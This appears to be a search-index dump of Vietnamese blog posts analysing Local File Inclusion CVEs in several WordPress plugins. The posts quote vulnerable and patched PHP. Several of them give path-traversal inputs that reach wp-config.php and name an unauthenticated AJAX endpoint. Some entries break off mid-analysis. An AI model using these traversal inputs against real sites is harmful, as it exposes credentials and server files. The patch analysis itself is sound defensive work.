} ?\u003e \u003c/div\u003e Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã c·ªßa bi·∫øn $action ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ tham s·ªë $_GET['tab']. M·∫∑c d√π bi·∫øn n√†y ƒë∆∞·ª£c x·ª≠ l√Ω qua h√†m sanitize_text_field(), h√†m n√†y ch·ªâ lo·∫°i b·ªè th·∫ª HTML - ch·ª© kh√¥ng ngƒÉn ch·∫∑n c√°c chu·ªói traversal nh∆∞ ../. Do ƒë√≥, attacker c√≥ th·ªÉ truy·ªÅn v√†o m·ªôt gi√° tr·ªã nh∆∞ ?tab=../../somefile, khi·∫øn $action ch·ª©a ƒë∆∞·ªùng d·∫´n ngo√†i mong ƒë·ª£i. Khi bi·∫øn n√†y ƒë∆∞·ª£c n·ªëi v√†o $template v√† sau ƒë√≥ ƒë∆∞·ª£c include =\u003e X·∫£y ra LFI. B·∫£n v√°: \u003c?php // Exit if accessed directly defined('ABSPATH') || exit; // Define allowed tab values to prevent LFI $allowed_tabs = array('general', 'envato'); // Apply filter to allow extensions to add their own tabs $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); // Verify nonce if tab parameter is set $action = 'general'; if (isset($_GET['tab'])) { // Verify nonce for tab switching if provided if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'license_envato_switch_tab')) { $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } elseif (!isset($_GET['_wpnonce'])) { // If no nonce is provided, still allow tab switching but sanitize input $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } } ?\u003e \u003cdiv class=\"wrap\"\u003e \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { // Ensure we only include files within the plugin directory structure $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); // Verify the template is a child of the nav view directory to prevent path traversal if ($template \u0026\u0026 $nav_view_dir \u0026\u0026 strpos($template, $nav_view_dir) === 0 \u0026\u0026 file_exists($template)) { include $template; } else { // Fallback to general.php with the same security checks $general_template = realpath(\"{$licenseEnvato_nav_view}/general.php\"); if ($general_template \u0026\u0026 strpos($general_template, $nav_view_dir) === 0) { include $general_template; } } } ?\u003e \u003c/div\u003e B·∫£n v√° ƒë√£ th·ª±c hi·ªán nhi·ªÅu bi·ªán ph√°p ƒë·ªÉ ngƒÉn ch·∫∑n l·ªó h·ªïng LFI v√† c·ªßng c·ªë t√≠nh b·∫£o m·∫≠t c·ªßa ph·∫ßn x·ª≠ l√Ω tham s·ªë tab: S·ª≠ d·ª•ng whitelist $allowed_tabs $allowed_tabs = array('general', 'envato'); $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); Ki·ªÉm tra nonce ch·ªëng CSRF if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(..., 'license_envato_switch_tab')) L√Ω do CVE ƒë∆∞·ª£c g√°n l√† Unauthenticated l√† v√¨ k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn t√†i kho·∫£n ri√™ng tr√™n site ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Subscribe to Download Lite Plugin.","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Subscribe to Download Lite phi√™n b·∫£n ‚â§ 1.2.9 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-30782 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.2.9 Patched Versions: 1.3.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Subscribe to Download Lite Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Subscribe to Download Lite: 1.2.9 (vulnerable) v√† 1.3.0 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); if (file_exists(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php')) { include(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php'); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e Trong phi√™n b·∫£n l·ªói, $form_template ƒë∆∞·ª£c concat v√†o chu·ªói v√† include nh∆∞ng kh√¥ng x√°c th·ª±c gi√° tr·ªã ƒë·∫ßu v√†o =\u003e nguy c∆° LFI x·∫£y ra, v√≠ d·ª•: $form_template = '../../../../../../../wp-config' B·∫£n v√°: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); $base_dir = realpath(STDL_PATH . 'inc/views/frontend/form-templates') . DIRECTORY_SEPARATOR; $sanitized_template = basename($form_template) . '.php'; $file_path = realpath($base_dir . $sanitized_template); if ($file_path \u0026\u0026 strpos($file_path, $base_dir) === 0 \u0026\u0026 file_exists($file_path)) { include($file_path); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e B·∫£n v√° s·ª≠ d·ª•ng basename() ƒë·ªÉ l·∫•y ph·∫ßn t√™n file c·ªßa $form_template lo·∫°i b·ªè c√°c k√Ω t·ª± traversal sequence ../, v√≠ d·ª•: ../../../../../../payload.pdf -\u003e payload.pdf Sau ƒë√≥ concat v√†o $base_dir v√† l·∫•y ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi b·∫±ng realpath r·ªìi include() =\u003e tri·ªát ti√™u ho√†n to√†n kh·∫£ nƒÉng LFI. Vulnerable Code form-template.php ch·ª©a code c√≥ l·ªó h·ªïng ·ªü tr√™n ƒë∆∞·ª£c g·ªçi trong stdl-shortcode.php \u003c?php $form_template = (!empty($atts['template'])) ? $atts['template'] : $form_details['layout']['template']; if (isset($_COOKIE['stdl_encryption_key']) \u0026\u0026 $this-\u003echeck_if_already_subscribed($_COOKIE['stdl_encryption_key']) \u0026\u0026 empty($form_details['general']['always_show'])) { // other logic } else { // other logic if ($display_type == 'direct') { include(STDL_PATH . 'inc/views/frontend/form-template.php'); } else { ?\u003e \u003cdiv class=\"stdl-popup-outerwrap \u003c?php echo esc_attr($popup_alias_class); ?\u003e\"\u003e \u003cinput type=\"button\" class=\"stdl-popup-trigger stdl-popup-\u003c?php echo esc_attr($form_template); ?\u003e\" value=\"\u003c?php echo esc_attr($popup_trigger_text); ?\u003e\"\u003e \u003cdiv class=\"stdl-popup-innerwrap\" style=\"display:none;\"\u003e \u003cdiv class=\"stdl-overlay stdl-popup-wrapper\"\u003e \u003cdiv class=\"stdl-popup-contetn-wrap\"\u003e \u003ca href=\"javascript:void(0)\" class=\"stdl-popup-close\"\u003e\u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c?php include(STDL_PATH . 'inc/views/frontend/form-template.php'); ?\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c?php } } $form_template l√† gi√° tr·ªã c·ªßa $atts['template'] Theo kinh nghi·ªám ph√¢n t√≠ch CVE tr√™n WordPress plugin c·ªßa t√¥i, $atts th∆∞·ªùng l√† c√°c attribute c·ªßa shortcode, v√≠ d·ª•: [pornhub id=69] C√≥ th·ªÉ th·∫•y r·∫±ng file form-template.php lu√¥n ƒë∆∞·ª£c include trong kh·ªëi if-else n·∫±m b√™n trong ph·∫ßn else, khi cookie stdl_encryption_key kh√¥ng t·ªìn t·∫°i (t·ª©c l√† ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng k√Ω ho·∫∑c ch∆∞a c√≥ kh√≥a m√£ h√≥a h·ª£p l·ªá). stdl-shortcode.php ƒë∆∞·ª£c include trong callback c·ªßa shortcode subscribe_to_download_form v·ªõi","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Team Manager Plugin.","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Team Manager phi√™n b·∫£n ‚â§ 2.1.23 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-30868 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2.1.23 Patched Versions: 2.2.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Team Manager Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Team Manager: 2.1.23 (vulnerable) v√† 2.2.0 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Elementor plugin Analysis Patch diff B·∫£n l·ªói: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/'); $templateName = sanitize_file_name( $styleType . '.php' ); //allowed file type $allowedFileTypes = [ 'php' ]; $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION); if (in_array($ext, $allowedFileTypes)) { if (file_exists($path . $templateName)) { include self::locateTemplate($templateName, '', $path); } } } private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } Trong phi√™n b·∫£n l·ªói, h√†m renderElementorLayout() kh√¥ng x√°c th·ª±c gi√° tr·ªã ƒë·∫ßu v√†o. attacker c√≥ th·ªÉ v∆∞·ª£t qua logic tr√™n khi ki·ªÉm so√°t ƒë∆∞·ª£c $layout v√† $settings, v√≠ d·ª•: Trong h√†m renderElementorLayout(): $layout = \"../../../../../../..\" $settings['../../../../../../.._style_type'] = \"wp-config\" Khi ƒë√≥: $styleType = 'wp-config' $path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $templateName=wp-config.php $path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php Debugger gi√° tr·ªã c·ªßa c√°c bi·∫øn Sau khi v∆∞·ª£t qua c√°c m·ªánh ƒë·ªÅ if th√¨ include gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../') : private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } Khi ƒë√≥: $templatePath = public/templates $defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $locate_template = locate_template('public/templates/wp-config.php') = \"\" - locate_template() s·∫Ω tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi c·ªßa file n·∫øu t√¨m th·∫•y, ng∆∞·ª£c l·∫°i tr·∫£ v·ªÅ chu·ªói r·ªóng \"\". Khi $locate_template r·ªóng th√¨ tr·∫£ v·ªÅ TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' ƒë·ªÉ include. B·∫£n v√°: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts if (!in_array($layout, $allowedLayouts, true)) { wp_die(__('Invalid layout.', 'wp-team-manager')); } $styleTypeKey = \"{$layout}_style_type\"; $styleType = $settings[$styleTypeKey] ?? ''; // Ensure only safe characters (alphanumeric + underscores) if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) { wp_die(__('Invalid style type.', 'wp-team-manager')); } // Ensure constants exist before using them if (!defined('TM_PATH')) { w","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Motors Plugin.","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Motors phi√™n b·∫£n ‚â§ 1.4.71 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-32654 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.4.71 Patched Versions: 1.4.72 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress Motors Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Motors: 1.4.71 (vulnerable) v√† 1.4.72 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: public static function motors_ew_grid_tabs() { $template = sanitize_text_field( $_POST['template'] ); // other logic } B·∫£n l·ªói ch·ªâ l·ªçc k√Ω t·ª± HTML b·∫±ng sanitize_text_field(), kh√¥ng gi·ªõi h·∫°n ƒë∆∞·ªùng d·∫´n, n√™n attacker c√≥ th·ªÉ ch√®n ../ ho·∫∑c t√™n file b·∫•t k·ª≥ =\u003e LFI. B·∫£n v√°: public static function motors_ew_grid_tabs() { $allowed_templates = array( 'listing-cars/listing-grid-directory-loop-4', 'listing-cars/listing-grid-directory-loop-3', 'listing-cars/listing-grid-directory-loop', ); $template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' ); if ( ! in_array( $template, $allowed_templates, true ) ) { wp_send_json_error( 'Invalid template' ); return; } // other logic } B·∫£n v√° √°p d·ª•ng sanitize_file_name() + whitelist ki·ªÉm tra h·ª£p l·ªá, gi√∫p kh√≥a ch·∫∑t input v√† lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng khai th√°c th√¥ng qua tham s·ªë template. Vulnerable Code H√†m motors_ew_grid_tabs() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook c√≥ t√™n \"grid_tabs_widget\" th√¥ng qua ƒëo·∫°n m√£: add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) ); Ti·ªÅn t·ªë wp_ajax_nopriv_ cho bi·∫øt action n√†y kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p khi g·ªçi ƒë·∫øn endpoint AJAX. Do ƒë√≥, endpoint th·ª±c t·∫ø c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p c√¥ng khai qua: /wp-admin/admin-ajax.php?action=grid_tabs_widget Khi ƒë√≥ motors_ew_grid_tabs() ƒë∆∞·ª£c g·ªçi: public static function motors_ew_grid_tabs() { check_ajax_referer( 'motors_grid_tabs', 'security' ); $listing_types = apply_filters( 'stm_listings_post_type', 'listings' ); $tab_type = sanitize_text_field( $_POST['tab_type'] ); $per_page = intval( $_POST['per_page'] ); $template = sanitize_text_field( $_POST['template'] ); $img_size = sanitize_text_field( $_POST['img_size'] ); $args = array( 'post_type' =\u003e $listing_types, 'post_status' =\u003e 'publish', 'posts_per_page' =\u003e $per_page, ); if ( 'popular' === $tab_type ) { $args = array_merge( $args, array( 'orderby' =\u003e 'meta_value_num', 'meta_key' =\u003e 'stm_car_views', 'order' =\u003e 'DESC', ) ); } $args['meta_query'][] = array( 'key' =\u003e 'car_mark_as_sold', 'value' =\u003e '', 'compare' =\u003e '=', ); $template_args = array(); if ( ! empty( $img_size ) ) { $template_args = array( 'custom_img_size' =\u003e $img_size, ); } $listings_query = new WP_Query( $args ); if ( $listings_query-\u003ehave_posts() ) { $output = ''; ob_start(); while ( $listings_query-\u003ehave_posts() ) { $listings_query-\u003ethe_post(); do_action( 'stm_listings_load_template', $template, $template_args ); } $output .= ob_get_clean(); } wp_send_json( array( 'html' =\u003e $output, ) ); } Trong h√†m motors_ew_grid_tabs(), d√≤ng ƒë·∫ßu ti√™n: check_ajax_referer( 'motors_grid_tabs', 'security' ); th·ª±c hi·ªán ki·ªÉm tra nonce ƒë·ªÉ b·∫£o v·ªá kh·ªèi CSRF (Cross-Site Request Forgery). N·∫øu nonce g·ª≠i t·ª´ client kh√¥ng h·ª£p l·ªá ho·∫∑c kh√¥ng t·ªìn t·∫°i, h√†m n√†y s·∫Ω d·ª´ng to√†n b·ªô qu√° tr√¨nh x·ª≠ l√Ω AJAX - nghƒ©a l√† c√°c ƒëo·∫°n logic ph√≠a sau (bao g·ªìm x·ª≠ l√Ω $template, truy v·∫•n b√†i vi·∫øt, v√† render HTML) s·∫Ω kh√¥ng ƒë∆∞·ª£c th·ª±c thi. public static function motors_create_nonce() { $grid_tabs_widget = wp_create_nonce( 'motors_grid_tabs' ); // other logic wp_localize_script( 'jquery', 'mew_nonces', array( 'motors_grid_tabs' =\u003e $grid_tabs_widget, // other logic )","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Geo Mashup Plugin.","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Geo Mashup phi√™n b·∫£n ‚â§ 1.13.16 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-48293 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.13.16 Patched Versions: 1.13.17 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Geo Mashup Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Geo Mashup: 1.13.16 (vulnerable) v√† 1.13.17 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? $_GET['template'] : ''; // other logc load_template( GeoMashup::locate_template( $template_base ) ); } $template_base ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['template'] kh√¥ng qua b·∫•t k·ª≥ ki·ªÉm tra/sanitize n√†o. K·∫øt qu·∫£ ƒë∆∞·ª£c truy·ªÅn v√†o GeoMashup::locate_template() r·ªìi d√πng load_template() - kh·∫£ nƒÉng k·∫ª t·∫•n c√¥ng ki·ªÉm so√°t ƒë∆∞·ªùng d·∫´n file ƒë·ªÉ include. B·∫£n v√°: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? sanitize_key($_GET['template']) : ''; // other logic load_template( GeoMashup::locate_template( $template_base ) ); } sanitize_key() ƒë∆∞·ª£c √°p d·ª•ng cho template =\u003e lo·∫°i b·ªè c√°c k√Ω t·ª± kh√¥ng an to√†n, ngƒÉn ../, \\, v√† c√°c k√Ω t·ª± ƒë·∫∑c bi·ªát l√†m gi·∫£m nguy c∆° path traversal v√† LFI t·ª´ tham s·ªë template. Vulnerable Code Ta ph√¢n t√≠ch logic trong GeoMashup::locate_template() c√≥ ·∫£nh h∆∞·ªüng g√¨ ƒë·∫øn $template_base public static function locate_template( $template_base ) { $template = locate_template( array(\"geo-mashup-$template_base.php\") ); if ( empty( $template ) || !is_readable( $template ) ) { $template = path_join( GEO_MASHUP_DIR_PATH, \"default-templates/$template_base.php\" ); } return $template; } $template ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã b·∫±ng c√°ch g·ªçi locate_template() thu·ªôc file template.php v·ªõi ƒë·ªëi s·ªë geo-mashup-$template_base.php function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) { global $wp_stylesheet_path, $wp_template_path; if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) { wp_set_template_globals(); } $is_child_theme = is_child_theme(); $located = ''; foreach ( (array) $template_names as $template_name ) { if ( ! $template_name ) { continue; } if ( file_exists( $wp_stylesheet_path . '/' . $template_name ) ) { $located = $wp_stylesheet_path . '/' . $template_name; break; } elseif ( $is_child_theme \u0026\u0026 file_exists( $wp_template_path . '/' . $template_name ) ) { $located = $wp_template_path . '/' . $template_name; break; } elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) { $located = ABSPATH . WPINC . '/theme-compat/' . $template_name; break; } } if ( $load \u0026\u0026 '' !== $located ) { load_template( $located, $load_once, $args ); } return $located; } C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file khi concat v·ªõi $template_name ƒë∆∞·ª£c x·ª≠ l√Ω, n·∫øu kh√¥ng t·ªìn t·∫°i th√¨ tr·∫£ v·ªÅ chu·ªói r·ªóng '' C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file Khi attack g·ª≠i $_GET['template'] ch·ª©a ../ th√¨ m·∫∑c ƒë·ªãnh file lu√¥n kh√¥ng t·ªìn t·∫°i, lu√¥n tr·∫£ v·ªÅ '' Quay tr·ªü l·∫°i GeoMashup::locate_template(), khi $template_name empty v√† kh√¥ng t·ªìn t·∫°i (!is_readable($template)) th√¨ ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã v√† tr·∫£ v·ªÅ. const string GEO_MASHUP_DIR_PATH = \"/srv/www/wordpress/wp-content/plugins/geo-mashup\" GEO_MASHUP_DIR_PATH.default-templates/$template_base.php üëâ GeoMashup::locate_template() kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn $template_base do ta ki·ªÉm so√°t, ta ti·∫øn h√†nh t√¨m c√°ch k√≠ch ho·∫°t s·ª± ki·ªán n√†y if ( ( isset( $_GET['output'] ) and 'json' == $_GET['output'] ) or empty( $_GET['object_ids'] ) ) { GeoMashupQuery::generate_location_json( ); } else { GeoMashupQuery::gen","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin.","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage phi√™n b·∫£n ‚â§ 19.11.0 ch·ª©a l·ªó h·ªïng Local File Inclusion (CVE-2025-53328, CVSS 7.5) cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-53328 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 19.11.0 Patched Versions: 19.11.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin Quan tr·ªçng M·∫∑c d√π l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë l√† Unauthenticated, trong th·ª±c t·∫ø vi·ªác khai th√°c ƒë√≤i h·ªèi k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn n·ªôi b·ªô t·ªëi thi·ªÉu ‚Äî v√≠ d·ª• t√†i kho·∫£n Contributor ho·∫∑c quy·ªÅn t∆∞∆°ng ƒë∆∞∆°ng tr√™n WordPress Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage: 19.11.0 (vulnerable) v√† 19.11.1 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: private static function prepare_view_file_name_form_current_page() { $view_file_name = ''; if ( !empty( $_REQUEST['page'] ) ) { $qry_str_check_os = sanitize_text_field( $_REQUEST['page'] ); $qry_str_check_os = explode( '-', $qry_str_check_os ); if ( 'opinionstage' === $qry_str_check_os[0] ) { $view_file_name = str_replace( 'opinionstage-', '', sanitize_text_field( $_REQUEST['page'] ) ); 